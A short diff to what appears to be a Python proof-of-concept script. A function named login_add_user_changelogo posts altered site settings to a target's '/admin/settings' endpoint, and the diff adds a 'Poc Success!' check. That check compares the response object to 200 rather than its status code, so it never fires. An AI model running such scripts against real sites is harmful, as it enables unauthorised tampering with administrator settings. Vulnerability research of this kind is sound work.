@@ -53,8 +53,9 @@ def login_add_user_changelogo(host):
                       'thumbnailHeight': '400', 'thumbnailQuality': '100', 'language': 'zh_CN',
                       'timezone': 'Asia%2FShanghai', 'locale': 'zh_CN', 'dateFormat': 'F /C Y'
                       }
-    session.post(host + '/admin/settings', data=change_payload)
-
+    check_mark = session.post(host + '/admin/settings', data=change_payload)
+    if check_mark == 200 :
+      print("Poc Success!")
     
 
 if __name__ == '__main__':
@@ -64,4 +65,3 @@ if __name__ == '__main__':
     h = sys.argv[1]
     config(h)
     login_add_user_changelogo(h)
-    print("fill date success!!!")
